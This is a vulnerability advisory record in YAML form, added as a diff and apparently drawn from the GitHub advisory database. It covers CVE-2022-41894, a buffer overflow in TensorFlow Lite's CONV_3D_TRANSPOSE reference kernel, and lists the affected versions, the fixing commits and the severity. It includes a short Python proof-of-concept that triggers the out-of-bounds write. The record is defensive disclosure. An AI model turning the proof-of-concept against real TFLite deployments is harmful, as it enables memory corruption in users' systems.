@@ -1,0 +1,207 @@
+advisory_id: GHSA-h6q3-vv32-2cq5
+datasource_id: github_osv/GHSA-h6q3-vv32-2cq5
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/11/GHSA-h6q3-vv32-2cq5/GHSA-h6q3-vv32-2cq5.json
+aliases:
+  - CVE-2022-41894
+summary: |
+  Buffer overflow in `CONV_3D_TRANSPOSE` on TFLite
+  ### Impact
+  The reference kernel of the [`CONV_3D_TRANSPOSE`](https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121) TensorFlow Lite operator wrongly increments the data_ptr when adding the bias to the result.
+
+  Instead of `data_ptr += num_channels;` it should be `data_ptr += output_num_channels;` as if the number of input channels is different than the number of output channels, the wrong result will be returned and a buffer overflow will occur if num_channels > output_num_channels.
+
+  An attacker can craft a model with a specific number of input channels in a way similar to the attached example script. It is then possible to write specific values through the bias of the layer outside the bounds of the buffer. This attack only works if the reference kernel resolver is used in the interpreter (i.e. `experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF` is used).
+  ```python
+  import tensorflow as tf
+  model = tf.keras.Sequential(
+      [
+          tf.keras.layers.InputLayer(input_shape=(2, 2, 2, 1024), batch_size=1),
+          tf.keras.layers.Conv3DTranspose(
+              filters=8,
+              kernel_size=(2, 2, 2),
+              padding="same",
+              data_format="channels_last",
+          ),
+      ]
+  )
+
+  converter = tf.lite.TFLiteConverter.from_keras_model(model)
+  tflite_model = converter.convert()
+
+  interpreter = tf.lite.Interpreter(
+      model_content=tflite_model,
+      experimental_op_resolver_type=tf.lite.experimental.OpResolverType.BUILTIN_REF,
+  )
+
+  interpreter.allocate_tensors()
+  interpreter.set_tensor(
+      interpreter.get_input_details()[0]["index"], tf.zeros(shape=[1, 2, 2, 2, 1024])
+  )
+  interpreter.invoke()
+  ```
+
+  ### Patches
+  We have patched the issue in GitHub commit [72c0bdcb25305b0b36842d746cc61d72658d2941](https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941).
+
+  The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.
+
+
+  ### For more information
+  Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.
+
+
+  ### Attribution
+  This vulnerability has been reported by Thibaut Goetghebuer-Planchon, Arm Ltd.
+impacted_packages:
+  - purl: pkg:pypi/tensorflow
+    affected_versions: vers:pypi/>=2.9.0|<2.9.3
+    fixed_versions: vers:pypi/2.9.3
+    affected_packages:
+      - pkg:pypi/tensorflow@2.9.0
+      - pkg:pypi/tensorflow@2.9.1
+      - pkg:pypi/tensorflow@2.9.2
+    fixed_packages:
+      - pkg:pypi/tensorflow@2.9.3
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:pypi/tensorflow
+    affected_versions: vers:pypi/>=2.10.0|<2.10.1
+    fixed_versions: vers:pypi/2.10.1
+    affected_packages:
+      - pkg:pypi/tensorflow@2.10.0
+    fixed_packages:
+      - pkg:pypi/tensorflow@2.10.1
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:pypi/tensorflow
+    affected_versions: vers:pypi/<2.8.4
+    fixed_versions: vers:pypi/2.8.4
+    affected_packages:
+      - pkg:pypi/tensorflow@0.12.0
+      - pkg:pypi/tensorflow@0.12.1
+      - pkg:pypi/tensorflow@1.0.0
+      - pkg:pypi/tensorflow@1.0.1
+      - pkg:pypi/tensorflow@1.1.0
+      - pkg:pypi/tensorflow@1.2.0
+      - pkg:pypi/tensorflow@1.2.1
+      - pkg:pypi/tensorflow@1.3.0
+      - pkg:pypi/tensorflow@1.4.0
+      - pkg:pypi/tensorflow@1.4.1
+      - pkg:pypi/tensorflow@1.5.0
+      - pkg:pypi/tensorflow@1.5.1
+      - pkg:pypi/tensorflow@1.6.0
+      - pkg:pypi/tensorflow@1.7.0
+      - pkg:pypi/tensorflow@1.7.1
+      - pkg:pypi/tensorflow@1.8.0
+      - pkg:pypi/tensorflow@1.9.0
+      - pkg:pypi/tensorflow@1.10.0
+      - pkg:pypi/tensorflow@1.10.1
+      - pkg:pypi/tensorflow@1.11.0
+      - pkg:pypi/tensorflow@1.12.0
+      - pkg:pypi/tensorflow@1.12.2
+      - pkg:pypi/tensorflow@1.12.3
+      - pkg:pypi/tensorflow@1.13.1
+      - pkg:pypi/tensorflow@1.13.2
+      - pkg:pypi/tensorflow@1.14.0
+      - pkg:pypi/tensorflow@1.15.0
+      - pkg:pypi/tensorflow@1.15.2
+      - pkg:pypi/tensorflow@1.15.3
+      - pkg:pypi/tensorflow@1.15.4
+      - pkg:pypi/tensorflow@1.15.5
+      - pkg:pypi/tensorflow@2.0.0
+      - pkg:pypi/tensorflow@2.0.1
+      - pkg:pypi/tensorflow@2.0.2
+      - pkg:pypi/tensorflow@2.0.3
+      - pkg:pypi/tensorflow@2.0.4
+      - pkg:pypi/tensorflow@2.1.0
+      - pkg:pypi/tensorflow@2.1.1
+      - pkg:pypi/tensorflow@2.1.2
+      - pkg:pypi/tensorflow@2.1.3
+      - pkg:pypi/tensorflow@2.1.4
+      - pkg:pypi/tensorflow@2.2.0
+      - pkg:pypi/tensorflow@2.2.1
+      - pkg:pypi/tensorflow@2.2.2
+      - pkg:pypi/tensorflow@2.2.3
+      - pkg:pypi/tensorflow@2.3.0
+      - pkg:pypi/tensorflow@2.3.1
+      - pkg:pypi/tensorflow@2.3.2
+      - pkg:pypi/tensorflow@2.3.3
+      - pkg:pypi/tensorflow@2.3.4
+      - pkg:pypi/tensorflow@2.4.0
+      - pkg:pypi/tensorflow@2.4.1
+      - pkg:pypi/tensorflow@2.4.2
+      - pkg:pypi/tensorflow@2.4.3
+      - pkg:pypi/tensorflow@2.4.4
+      - pkg:pypi/tensorflow@2.5.0
+      - pkg:pypi/tensorflow@2.5.1
+      - pkg:pypi/tensorflow@2.5.2
+      - pkg:pypi/tensorflow@2.5.3
+      - pkg:pypi/tensorflow@2.6.0rc0
+      - pkg:pypi/tensorflow@2.6.0rc1
+      - pkg:pypi/tensorflow@2.6.0rc2
+      - pkg:pypi/tensorflow@2.6.0
+      - pkg:pypi/tensorflow@2.6.1
+      - pkg:pypi/tensorflow@2.6.2
+      - pkg:pypi/tensorflow@2.6.3
+      - pkg:pypi/tensorflow@2.6.4
+      - pkg:pypi/tensorflow@2.6.5
+      - pkg:pypi/tensorflow@2.7.0rc0
+      - pkg:pypi/tensorflow@2.7.0rc1
+      - pkg:pypi/tensorflow@2.7.0
+      - pkg:pypi/tensorflow@2.7.1
+      - pkg:pypi/tensorflow@2.7.2
+      - pkg:pypi/tensorflow@2.7.3
+      - pkg:pypi/tensorflow@2.7.4
+      - pkg:pypi/tensorflow@2.8.0rc0
+      - pkg:pypi/tensorflow@2.8.0rc1
+      - pkg:pypi/tensorflow@2.8.0
+      - pkg:pypi/tensorflow@2.8.1
+      - pkg:pypi/tensorflow@2.8.2
+      - pkg:pypi/tensorflow@2.8.3
+    fixed_packages:
+      - pkg:pypi/tensorflow@2.8.4
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/tensorflow/tensorflow
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/tensorflow/tensorflow
+        commit: 72c0bdcb25305b0b36842d746cc61d72658d2941
+        patch_text:
+      - vcs_url: https://github.com/tensorflow/tensorflow
+        commit: 091e63f0ea33def7ecad661a5ac01dcafbafa90b
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '7.1'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2022/11/GHSA-h6q3-vv32-2cq5/GHSA-h6q3-vv32-2cq5.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-120
+references:
+  - url: https://github.com/tensorflow/tensorflow
+    reference_type:
+    reference_id:
+  - url: https://github.com/tensorflow/tensorflow/blob/091e63f0ea33def7ecad661a5ac01dcafbafa90b/tensorflow/lite/kernels/internal/reference/conv3d_transpose.h#L121
+    reference_type:
+    reference_id:
+  - url: https://github.com/tensorflow/tensorflow/commit/72c0bdcb25305b0b36842d746cc61d72658d2941
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2022-41894
+    reference_type:
+    reference_id: CVE-2022-41894
+  - url: https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h6q3-vv32-2cq5
+    reference_type:
+    reference_id: GHSA-h6q3-vv32-2cq5
+exploits: []
